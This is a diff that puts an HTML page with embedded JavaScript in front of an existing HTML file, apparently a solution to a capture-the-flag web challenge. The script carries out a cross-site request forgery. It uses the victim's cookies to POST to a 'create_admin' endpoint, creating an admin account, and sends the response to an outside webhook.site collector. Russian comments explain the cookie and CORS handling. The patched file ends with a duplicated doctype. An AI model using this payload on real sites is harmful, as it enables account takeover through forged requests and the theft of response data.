@@ -1,4 +1,44 @@
 <!DOCTYPE html>
+<html>
+<body>
+<script>
+  // Отправляем POST-запрос на create_admin от имени жертвы
+  fetch('http://tasks.goidactf.ru:20309/create_admin', {
+    method: 'POST',
+    credentials: 'include',  // ← обязательно для отправки кук
+    headers: {
+      'Content-Type': 'application/x-www-form-urlencoded',
+      'Referer': 'http://tasks.goidactf.ru:20309/admin',
+      'Origin': 'http://tasks.goidactf.ru:20309'
+    },
+    body: 'new_admin_login=123'
+  })
+  .then(res => {
+    // ЭТО РАБОТАЕТ ТОЛЬКО ЕСЛИ ЕСТЬ CORS!
+    return res.text().then(body => ({
+      status: res.status,
+      headers: [...res.headers.entries()],
+      body: body
+    }));
+  })
+  .then(data => {
+    fetch('https://webhook.site/d7a1179b-eb8b-4901-801d-0afbed2f3741', {
+      method: 'POST',
+      body: JSON.stringify(data),
+      headers: { 'Content-Type': 'application/json' }
+    });
+  })
+  .catch(err => {
+    // Если CORS блокирует — попадём сюда
+    fetch('https://webhook.site/d7a1179b-eb8b-4901-801d-0afbed2f3741', {
+      method: 'POST',
+      body: JSON.stringify({ error: err.toString() }),
+      headers: { 'Content-Type': 'application/json' }
+    });
+  });
+</script>
+</body>
+</html><!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
